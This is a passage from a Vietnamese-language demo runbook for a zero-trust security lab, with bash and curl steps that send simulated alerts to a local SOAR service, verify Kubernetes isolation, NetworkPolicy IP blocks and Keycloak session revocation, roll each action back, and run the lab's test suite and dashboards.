  echo "$EVIDENCE" | python3 -c "
import json,sys
d = json.load(sys.stdin)
print('affected_service:', d.get('affected_service'))
print('source_ip       :', d.get('source_ip'))
print('loki_evidence   :', len(d.get('loki_evidence',[])), 'entries')
print('opa_denials     :', len(d.get('opa_denials',[])), 'entries')
print('summary         :', d.get('summary','')[:120])
"
fi
```

```bash
echo ""
echo "=== BƯỚC 4: Admin APPROVE → trigger SOAR ==="
if [ -n "$ALERT_ID" ]; then
  APPROVE_RESP=$(curl -s -X POST "http://localhost:18082/pending/$ALERT_ID/approve" \
    -H "Content-Type: application/json" \
    -d '{"note":"flow3 demo approval — confirmed fraud_gate_bypass pattern"}')
  echo "$APPROVE_RESP" | python3 -c "
import json,sys
d = json.load(sys.stdin)
print('approved  :', d.get('status'))
print('thehive   :', d.get('thehive_case_id','N/A'))
print('soar_case :', d.get('soar_case_id','N/A'))
"
  sleep 3
fi
```

```bash
echo ""
echo "=== BƯỚC 5: Xem SOAR case và 4 phases ==="
CASES=$(curl -s http://localhost:18091/cases)
echo "$CASES" | python3 -c "
import json,sys
cases = json.load(sys.stdin)
relevant = [c for c in cases if c.get('attack_type') in ('fraud_gate_bypass','unknown')]
if not relevant:
    print('Chưa có case — đợi vài giây rồi thử lại')
    sys.exit(0)
case = relevant[-1]
print(f'case_id  : {case[\"case_id\"]}')
print(f'status   : {case[\"status\"]}')
print(f'playbook : {case[\"playbook\"]}')
print(f'workload : {case.get(\"target_workload\")}')
print()
print('=== 4 PHASES ===')
for step in case.get('steps',[]):
    status_icon = '✓' if step['status']=='completed' else ('?' if step['status']=='skipped' else '✗')
    print(f'  {status_icon} [{step[\"phase\"]:11s}] {step[\"action\"][:80]}')
"
```

```bash
echo ""
echo "=== BƯỚC 6: Xác minh K8s action (nếu SOAR_DRY_RUN=false) ==="
# Kiểm tra Service selector có annotation isolated không
kubectl --context ctx-aws get svc payment-service -n financial \
  -o jsonpath='{.metadata.annotations.soar\.ztlab\.io/isolated-at}' 2>/dev/null \
  && echo " ← Service đang bị isolated" \
  || echo "Service bình thường (dry_run hoặc chưa execute)"

# Kiểm tra endpoints có empty không
kubectl --context ctx-aws get endpoints payment-service -n financial
```

```bash
echo ""
echo "=== BƯỚC 7: ROLLBACK — khôi phục service ==="
CASE_ID=$(curl -s http://localhost:18091/cases | python3 -c "
import json,sys
cases = json.load(sys.stdin)
rb = [c for c in cases
      if c.get('playbook')=='isolate_workload'
      and c.get('status') in ('dry_run','executed')]
print(rb[-1]['case_id'] if rb else '')
")

if [ -n "$CASE_ID" ]; then
  ROLLBACK=$(curl -s -X POST "http://localhost:18091/cases/$CASE_ID/rollback")
  echo "$ROLLBACK" | python3 -c "
import json,sys
d = json.load(sys.stdin)
print('rollback status:', d.get('status'))
print('action         :', d.get('action'))
"
  # Xác minh endpoints được restore
  sleep 2
  kubectl --context ctx-aws get endpoints payment-service -n financial
  echo ""
  echo "payment-service đã được restore ✓"
else
  echo "Không tìm thấy case để rollback"
fi

echo ""
echo "Flow 3 hoàn tất ✓"
```

---

### Flow 4 — SOAR block_source_ip → xác minh NetworkPolicy → Rollback

**Mục tiêu chứng minh:** Port scan phát hiện → SOAR tạo NetworkPolicy deny IP/32 → kiểm tra K8s → rollback xóa NetworkPolicy.

```bash
echo "=== BƯỚC 1: Gửi port_scan alert trực tiếp đến SOAR ==="
SOAR_RESP=$(curl -s -X POST http://localhost:18091/alerts \
  -H "Content-Type: application/json" \
  -d '{
    "verdict": "malicious",
    "severity": "high",
    "confidence": 0.88,
    "attack_type": "port_scan",
    "summary": "nmap SYN scan detected port_tried=1024 source_ip=10.9.8.99",
    "source_ip": "10.9.8.99",
    "affected_service": "api-gateway",
    "evidence": ["nmap syn scan ports_tried=1024 from 10.9.8.99"],
    "log_hash": "portscan-demo-001"
  }')

echo "$SOAR_RESP" | python3 -m json.tool
```

```bash
echo ""
echo "=== BƯỚC 2: Xem 4-step execution ==="
echo "$SOAR_RESP" | python3 -c "
import json,sys
d = json.load(sys.stdin)
print(f'case_id  : {d[\"case_id\"]}')
print(f'playbook : {d[\"playbook\"]}  (phải = block_source_ip)')
print(f'source_ip: {d.get(\"source_ip\")}')
print(f'status   : {d[\"status\"]}')
print()
print('=== 4 PHASES ===')
for step in d.get('steps',[]):
    icon = '✓' if step['status']=='completed' else ('→' if step['status']=='skipped' else '✗')
    print(f'  {icon} [{step[\"phase\"]:11s}] {step[\"action\"][:90]}')
"
```

```bash
echo ""
echo "=== BƯỚC 3: Xác minh NetworkPolicy đã tạo (chỉ khi dry_run=false) ==="
kubectl --context ctx-aws get networkpolicy -n financial \
  -l soar.ztlab.io/type=ip-block 2>/dev/null

# Xem chi tiết NetworkPolicy block IP
kubectl --context ctx-aws get networkpolicy -n financial \
  -l soar.ztlab.io/managed=true -o yaml 2>/dev/null \
  | grep -A10 "ipBlock\|except\|blocked-ip" | head -20

# Nếu dry_run=true sẽ không có NetworkPolicy — đây là bình thường
```

```bash
echo ""
echo "=== BƯỚC 4: Kiểm tra investigate step — evidence từ Loki ==="
echo "$SOAR_RESP" | python3 -c "
import json,sys
d = json.load(sys.stdin)
steps = d.get('steps',[])
inv = next((s for s in steps if s['phase']=='investigate'), None)
if inv:
    print('Investigate:', inv['action'])
    print('Status     :', inv['status'])
"
```

```bash
echo ""
echo "=== BƯỚC 5: Rollback — xóa NetworkPolicy ==="
BLOCK_CASE_ID=$(echo "$SOAR_RESP" | python3 -c "import json,sys; print(json.load(sys.stdin)['case_id'])")

ROLLBACK=$(curl -s -X POST "http://localhost:18091/cases/$BLOCK_CASE_ID/rollback" \
  -H "Content-Type: application/json")
echo "$ROLLBACK" | python3 -c "
import json,sys
d = json.load(sys.stdin)
print('rollback status:', d.get('status'))
print('action         :', d.get('action'))
"

# Xác minh NetworkPolicy đã bị xóa
sleep 1
echo "NetworkPolicy còn lại:"
kubectl --context ctx-aws get networkpolicy -n financial \
  -l soar.ztlab.io/type=ip-block 2>/dev/null || echo "(không còn)"

echo ""
echo "Flow 4 hoàn tất ✓"
```

---

### Flow 5 — SOAR revoke_user_sessions → xác minh Keycloak

**Mục tiêu chứng minh:** Brute force phát hiện → SOAR gọi Keycloak Admin API revoke toàn bộ session → user phải login lại.

```bash
echo "=== BƯỚC 1: Tạo session cho testuser01 ==="
# Lấy token testuser01 (tạo session)
TOKEN2=$(curl -s -X POST \
  http://localhost:18443/realms/ztlab/protocol/openid-connect/token \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "grant_type=password&client_id=web-portal&username=testuser01&password=Test1234!" \
  | python3 -c "import sys,json; print(json.load(sys.stdin).get('access_token','ERROR'))")
echo "Token2 lấy được: ${TOKEN2:0:30}..."

# Xác minh session tồn tại trong Keycloak
ADMIN_TOKEN=$(curl -s -X POST \
  http://localhost:18443/realms/master/protocol/openid-connect/token \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "grant_type=password&client_id=admin-cli&username=admin&password=ztlab-admin-2026" \
  | python3 -c "import sys,json; print(json.load(sys.stdin).get('access_token','ERROR'))")

USER_ID=$(curl -s \
  "http://localhost:18443/admin/realms/ztlab/users?username=testuser01&exact=true" \
  -H "Authorization: Bearer $ADMIN_TOKEN" \
  | python3 -c "import json,sys; u=json.load(sys.stdin); print(u[0]['id'] if u else '')")

SESSION_COUNT=$(curl -s \
  "http://localhost:18443/admin/realms/ztlab/users/$USER_ID/sessions" \
  -H "Authorization: Bearer $ADMIN_TOKEN" \
  | python3 -c "import json,sys; print(len(json.load(sys.stdin)))")

echo "Sessions hiện tại của testuser01: $SESSION_COUNT"
```

```bash
echo ""
echo "=== BƯỚC 2: Gửi brute_force alert → SOAR revoke sessions ==="
SOAR_RESP2=$(curl -s -X POST http://localhost:18091/alerts \
  -H "Content-Type: application/json" \
  -d '{
    "verdict": "malicious",
    "severity": "critical",
    "confidence": 0.92,
    "attack_type": "brute_force",
    "summary": "20 failed logins in 30s against testuser01",
    "source_ip": "203.0.113.10",
    "username": "testuser01",
    "affected_service": "api-gateway",
    "log_hash": "brute-force-demo-001"
  }')

echo "$SOAR_RESP2" | python3 -c "
import json,sys
d = json.load(sys.stdin)
print(f'playbook : {d[\"playbook\"]}  (phải = revoke_user_sessions)')
print(f'username : {d.get(\"username\")}')
print(f'status   : {d[\"status\"]}')
print()
print('=== 4 PHASES ===')
for step in d.get('steps',[]):
    icon = '✓' if step['status']=='completed' else ('→' if step['status']=='skipped' else '✗')
    print(f'  {icon} [{step[\"phase\"]:11s}] {step[\"action\"][:90]}')
"
```

```bash
echo ""
echo "=== BƯỚC 3: Kiểm tra session đã bị revoke ==="
SESSION_COUNT_AFTER=$(curl -s \
  "http://localhost:18443/admin/realms/ztlab/users/$USER_ID/sessions" \
  -H "Authorization: Bearer $ADMIN_TOKEN" \
  | python3 -c "import json,sys; print(len(json.load(sys.stdin)))")

echo "Sessions trước revoke: $SESSION_COUNT"
echo "Sessions sau  revoke : $SESSION_COUNT_AFTER"
# Mong đợi: sau = 0 (hoặc < trước)
```

```bash
echo ""
echo "=== BƯỚC 4: Xác minh token cũ không dùng được nữa ==="
curl -s -X POST http://localhost:18080/payments \
  -H "Authorization: Bearer $TOKEN2" \
  -H "Content-Type: application/json" \
  -d '{"from_account":"ACC-1001","to_account":"ACC-2001","amount":1000}' \
  -o /dev/null -w "HTTP status: %{http_code}\n"
# Với OIDC stateless JWT: token vẫn pass verify đến hết TTL (300s)
# Revoke chặn login mới — user phải authenticate lại sau khi token hết hạn
echo "(JWT Bearer là stateless — revoke ngăn chặn login mới, token hiện tại hết hạn sau TTL 300s)"
```

```bash
echo ""
echo "=== BƯỚC 5: Rollback note ==="
REVOKE_CASE=$(echo "$SOAR_RESP2" | python3 -c "import json,sys; print(json.load(sys.stdin)['case_id'])")
ROLLBACK2=$(curl -s -X POST "http://localhost:18091/cases/$REVOKE_CASE/rollback")
echo "$ROLLBACK2" | python3 -c "
import json,sys
d = json.load(sys.stdin)
print('rollback status:', d.get('status'))
print('action         :', d.get('action'))
"
# revoke_user_sessions không có auto-rollback — admin phải mở khóa trong Keycloak UI
echo ""
echo "Để mở khóa user: Keycloak Admin → Realm ztlab → Users → testuser01 → Sessions"
echo ""
echo "Flow 5 hoàn tất ✓"
```

---

### Flow 6 — Chạy toàn bộ test suite tự động (20 kịch bản)

**Mục tiêu:** Kiểm thử tự động hóa — chạy tất cả 20 scenario cùng lúc, ghi kết quả.

```bash
echo "=== Kiểm tra biến môi trường ==="
export GW_URL=http://localhost:18080
export KC_URL=http://localhost:18443
export AI_URL=http://localhost:18082
export SOAR_URL=http://localhost:18091
export LOKI_URL=http://localhost:13100

echo "GW_URL  : $GW_URL"
echo "KC_URL  : $KC_URL"
echo "AI_URL  : $AI_URL"
echo "SOAR_URL: $SOAR_URL"
```

```bash
echo "=== Chạy full test suite ==="
cd /path/to/repo  # thay bằng đường dẫn thực của repo

# Chạy tất cả 20 scenarios
python3 tests/scenario_00_full_suite.py

# Hoặc chạy từng scenario lẻ
bash tests/scenario_01_brute_force.sh
bash tests/scenario_12_soar_response.sh  # test SOAR 4-step
```

```bash
# Xem kết quả metrics sau khi chạy
python3 tests/collect_metrics.py
python3 tests/perf_overhead.py

# Kết quả lưu tại:
ls results/
# metrics.json, perf_overhead.json
```

---

### Flow 7 — Xem toàn bộ kết quả trên Grafana + TheHive

```bash
echo "=== Link trực tiếp đến từng dashboard ==="
echo "Security Overview  : http://localhost:3000/d/ztlab-security-overview"
echo "Envoy Access Logs  : http://localhost:3000/d/ztlab-envoy-access"
echo "OPA Decision Log   : http://localhost:3000/d/ztlab-opa-decisions"
echo "AI SIEM SOAR       : http://localhost:3000/d/ztlab-ai-siem-soar"
echo "Threat Intel Feed  : http://localhost:3000/d/ztlab-threat-intel"
echo ""
echo "TheHive alerts     : http://localhost:19000/index.html#/alerts"
echo "TheHive cases      : http://localhost:19000/index.html#/cases"
echo "SOAR cases API     : http://localhost:18091/cases"
echo "AI pending alerts  : http://localhost:18082/pending"
```

```bash
echo ""
echo "=== Thống kê nhanh sau demo ==="

# SOAR cases
echo "--- SOAR Cases ---"
curl -s http://localhost:18091/cases | python3 -c "
import json,sys
cases = json.load(sys.stdin)
from collections import Counter
status_count = Counter(c['status'] for c in cases)
pb_count = Counter(c['playbook'] for c in cases)
print(f'  Total cases: {len(cases)}')
for s,n in status_count.items(): print(f'  status={s}: {n}')
for p,n in pb_count.items(): print(f'  playbook={p}: {n}')
"

echo ""
echo "--- AI Pending Alerts ---"
curl -s "http://localhost:18082/pending" | python3 -c "
import json,sys
alerts = json.load(sys.stdin)
from collections import Counter
sc = Counter(a['severity'] for a in alerts)
print(f'  Total: {len(alerts)}')
for s,n in sc.items(): print(f'  severity={s}: {n}')
"

echo ""
echo "--- NetworkPolicies SOAR-managed ---"
kubectl --context ctx-aws get networkpolicy -n financial \
  -l soar.ztlab.io/managed=true --no-headers 2>/dev/null \
  | awk '{print "  " $1 " | " $2}' \
  || echo "  (không có NetworkPolicy SOAR-managed)"
```

---

### Tóm tắt các flow và kết quả mong đợi

| Flow | Mục đích | Kết quả mong đợi |
|------|---------|-----------------|
| **Flow 1** | Giao dịch bình thường | `status:completed`, trace_id xuất hiện cả AWS lẫn OpenStack log, SVID xác nhận |
| **Flow 2** | AI phát hiện tấn công | `verdict:malicious`, pending alert tạo, Grafana rule FIRING |
| **Flow 3** | HITL + isolate_workload | 4 phases logged, Service selector patched, rollback restore endpoint |
| **Flow 4** | block_source_ip | NetworkPolicy tạo với `except:[IP/32]`, rollback xóa NetworkPolicy |
| **Flow 5** | revoke_user_sessions | Keycloak sessions=0 sau revoke, rollback note ghi nhận |
| **Flow 6** | 20 scenarios tự động | ≥18/20 PASS (2 có thể SKIP nếu infrastructure không hỗ trợ) |
| **Flow 7** | Xem Grafana + TheHive | Dashboard hiển thị đủ data, TheHive có alerts/cases từ AI |
